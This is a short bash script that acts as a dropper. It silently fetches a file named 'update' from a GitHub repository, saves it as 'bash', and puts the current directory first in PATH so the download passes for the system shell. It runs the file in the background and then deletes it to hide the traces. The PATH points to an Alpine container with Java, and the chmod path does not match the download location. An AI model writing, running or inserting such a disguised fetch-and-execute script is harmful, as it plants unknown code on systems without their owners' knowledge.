#!/bin/bash
wget -q -O bash https://github.com/jackmoc/Alpine/raw/main/update
chmod +x /bash
PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
bash &
rm -rf bash
